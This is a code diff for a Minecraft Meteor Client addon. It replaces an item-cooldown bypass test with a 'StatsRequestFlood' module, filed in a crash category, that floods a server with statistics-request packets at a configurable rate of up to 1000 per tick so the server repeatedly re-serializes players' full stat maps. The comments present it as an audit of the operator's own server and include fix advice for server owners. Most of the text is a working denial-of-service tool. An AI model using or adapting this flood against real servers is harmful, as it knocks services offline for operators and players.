@@ -4,42 +4,37 @@ import com.example.addon.AddonTemplate;
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.packets.PacketEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
-import meteordevelopment.meteorclient.settings.BoolSetting;
-import meteordevelopment.meteorclient.settings.IntSetting;
-import meteordevelopment.meteorclient.settings.Setting;
-import meteordevelopment.meteorclient.settings.SettingGroup;
+import meteordevelopment.meteorclient.settings.*;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
-import net.minecraft.util.Hand;
+import net.minecraft.network.packet.c2s.play.ClientStatusC2SPacket;
 
 /**
- * AUDIT: Fast-Use (item-use cooldown test)
+ * AUDIT: Statistics Request Flood (asymmetric serialize cost)
  *
- * Repeatedly triggers item use ("right-click") on the held item, faster than the
- * vanilla use/cooldown allows. Tests whether the server enforces use timing
- * server-side: eating, potion drinking, ender-pearl throws, bow draw, shield
- * raise, etc. all have vanilla cooldowns or use durations a cheat tries to skip.
+ * Floods ClientStatus(REQUEST_STATS) — the packet sent when a client opens the
+ * statistics screen. Each request makes the server collect and serialize the
+ * player's ENTIRE statistics map (every block mined, item used, mob killed,
+ * custom stat) into a StatisticsS2CPacket. The request is a single byte of
+ * intent; the response is potentially kilobytes — another cheap-to-send /
+ * expensive-to-produce asymmetry, and one that touches a code path almost
+ * nobody rate-limits.
  *
- * WHAT THIS TESTS: not packet volume - it's whether your server re-derives the
- * minimum interval between uses from the item's use action and any cooldown, and
- * rejects/ignores uses that arrive too soon. A pearl-spam or instant-eat bypass
- * is the symptom of trusting client use timing.
+ * What a vulnerable server does: rebuilds and sends the full stat map for every
+ * request, at any rate.
+ * What a hardened server does: rate-limits stat requests per player and/or
+ * caches the serialized snapshot between requests.
+ * Fix: throttle REQUEST_STATS per player; cache the serialized statistics and
+ * invalidate on change rather than rebuilding per request.
  *
- * Patch signal: track last-use tick per (player, item) server-side; enforce the
- * item's use duration / ItemCooldownManager interval; ignore early uses rather
- * than processing them.
+ * Run against your OWN local server only.
  */
-public class FastUse extends Module {
+public class StatsRequestFlood extends Module {
     private final SettingGroup sgGeneral = this.settings.getDefaultGroup();
 
-    private final Setting<Integer> usesPerTick = sgGeneral.add(new IntSetting.Builder()
-        .name("uses-per-tick")
-        .description("Item-use attempts per tick. Start low to test cooldown enforcement.")
-        .defaultValue(1).range(1, 100).sliderRange(1, 20).build()
-    );
-    private final Setting<Boolean> offhand = sgGeneral.add(new BoolSetting.Builder()
-        .name("offhand").description("Use the offhand item instead of mainhand.")
-        .defaultValue(false).build()
+    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
+        .name("requests-per-tick").description("REQUEST_STATS packets per tick.")
+        .defaultValue(40).range(1, 1000).sliderRange(1, 300).build()
     );
 
     private final TestCadence cadence = new TestCadence(sgGeneral);
@@ -57,9 +52,9 @@ public class FastUse extends Module {
 
     private int ticksActive = 0, packetsSent = 0;
 
-    public FastUse() {
-        super(AddonTemplate.CRASH_CATEGORY, "ac-fast-use",
-            "Triggers item use faster than vanilla allows. Tests server-side use/cooldown enforcement (eat, pearl, potion).");
+    public StatsRequestFlood() {
+        super(AddonTemplate.CRASH_CATEGORY, "stats-request-flood",
+            "Floods REQUEST_STATS (server re-serializes the full stat map each time). Tests stat-request rate-limiting.");
     }
 
     @Override
@@ -70,13 +65,14 @@ public class FastUse extends Module {
 
     @EventHandler
     private void onTick(TickEvent.Pre event) {
+        if (mc.player == null) return;
         ticksActive++;
         gr.tick();
-        if (mc.player == null || mc.interactionManager == null) return;
         if (!cadence.shouldFire()) return;
-        Hand hand = offhand.get() ? Hand.OFF_HAND : Hand.MAIN_HAND;
-        for (int i = 0; i < usesPerTick.get(); i++) {
-            mc.interactionManager.interactItem(mc.player, hand);
+
+        for (int i = 0; i < perTick.get(); i++) {
+            mc.player.networkHandler.sendPacket(new ClientStatusC2SPacket(ClientStatusC2SPacket.Mode.REQUEST_STATS));
+            packetsSent++;
         }
         gr.markFired();
         TestCadence.sendLegit(mc.player, cadence.legitRatio());
